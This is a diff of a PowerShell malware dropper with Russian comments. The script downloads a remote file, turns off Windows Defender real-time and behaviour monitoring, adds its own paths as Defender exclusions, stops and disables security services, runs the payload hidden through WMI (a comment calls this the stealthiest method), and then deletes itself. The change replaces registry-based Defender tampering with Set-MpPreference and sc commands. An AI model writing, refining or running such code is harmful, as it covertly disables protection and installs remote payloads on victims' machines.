@@ -17,73 +17,49 @@ try{
     (New-Object Net.WebClient).DownloadFile($v1,$v2)
     if(Test-Path $v2){Move-Item $v2 $v4 -Force}
 
-    $r=@(
-        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender";N="DisableAntiSpyware";V=1;T="DWord"},
-        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection";N="DisableRealtimeMonitoring";V=1;T="DWord"},
-        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection";N="DisableBehaviorMonitoring";V=1;T="DWord"},
-        @{P="HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection";N="DisableOnAccessProtection";V=1;T="DWord"}
-    )
+    # Отключаем через PowerShell команды (работает без прав реестра)
+    try{
+        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+    }catch{}
 
-    foreach($s in $r){
-        try{
-            if(!(Test-Path $s.P)){New-Item -Path $s.P -Force | Out-Null}
-            Set-ItemProperty -Path $s.P -Name $s.N -Value $s.V -Type $s.T -Force
-        }catch{}
-    }
+    # Добавляем в исключения через PowerShell
+    try{
+        Add-MpPreference -ExclusionPath $v4 -ErrorAction SilentlyContinue
+        Add-MpPreference -ExclusionPath $v3 -ErrorAction SilentlyContinue
+    }catch{}
 
-    $services = @("WinDefend","WdNisSvc","Sense","SecurityHealthService","wscsvc")
+    # Останавливаем службы через sc (более надежно)
+    $services = @("WinDefend","WdNisSvc","Sense","SecurityHealthService")
     foreach($service in $services){
         try{
-            Stop-Service -Name $service -Force -ErrorAction Stop
-            Set-Service -Name $service -StartupType Disabled -ErrorAction Stop
+            Start-Process -FilePath "sc" -ArgumentList "stop", $service -Wait -WindowStyle Hidden
             Start-Process -FilePath "sc" -ArgumentList "config", $service, "start=", "disabled" -Wait -WindowStyle Hidden
         }catch{}
     }
 
-    $processes = @("MsMpEng.exe","NisSrv.exe","MsSense.exe","SecurityHealthService.exe","SecurityHealthSystray.exe")
-    foreach($process in $processes){
+    Start-Sleep -Seconds 3
+
+    # Запускаем файл через WMI (самый скрытный способ)
+    try{
+        $w=[WmiClass]"\\localhost\root\cimv2:Win32_Process"
+        $r=$w.Create("`"$v4`"")
+    }catch{
+        # Если WMI не работает, запускаем скрыто
         try{
-            Get-Process -Name $process.Replace(".exe", "") -ErrorAction SilentlyContinue | Stop-Process -Force
+            Start-Process -FilePath $v4 -WindowStyle Hidden
         }catch{}
     }
 
-    $e="HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
-    if(!(Test-Path $e)){New-Item -Path $e -Force | Out-Null}
-    try{
-        New-ItemProperty -Path $e -Name $v4 -PropertyType String -Value "0" -Force
-        New-ItemProperty -Path $e -Name $v3 -PropertyType String -Value "0" -Force
-    }catch{}
-
     Start-Sleep -Seconds 2
 
-    $m=@(
-        {
-            $w=[WmiClass]"\\localhost\root\cimv2:Win32_Process"
-            $r=$w.Create("`"$v4`"")
-            return $r.ReturnValue -eq 0
-        },
-        {
-            $t="WU"+[System.IO.Path]::GetRandomFileName().Split('.')[0]
-            $a=New-ScheduledTaskAction -Execute $v4
-            $tr=New-ScheduledTaskTrigger -At (Get-Date).AddSeconds(1) -Once
-            Register-ScheduledTask -TaskName $t -Action $a -Trigger $tr -Force | Out-Null
-            Start-ScheduledTask -TaskName $t
-            Start-Sleep -Seconds 2
-            Unregister-ScheduledTask -TaskName $t -Confirm:$false
-            return $true
-        }
-    )
-
-    $sc=$false
-    foreach($mt in $m){
-        try{if(& $mt){$sc=$true;break}}catch{}
-    }
-
-    Start-Sleep -Seconds 3
+    # Очистка
     if(Test-Path $v2){Remove-Item $v2 -Force -ErrorAction SilentlyContinue}
 
+    # Самоудаление скрипта
     $sp=$MyInvocation.MyCommand.Path
     if(Test-Path $sp){
-        Start-Process -FilePath "cmd.exe" -ArgumentList "/c","ping 127.0.0.1 -n 4 > nul & del /f /q `"$sp`"" -WindowStyle Hidden
+        Start-Process -FilePath "cmd.exe" -ArgumentList "/c","timeout /t 3 > nul & del /f /q `"$sp`"" -WindowStyle Hidden
     }
 }catch{}
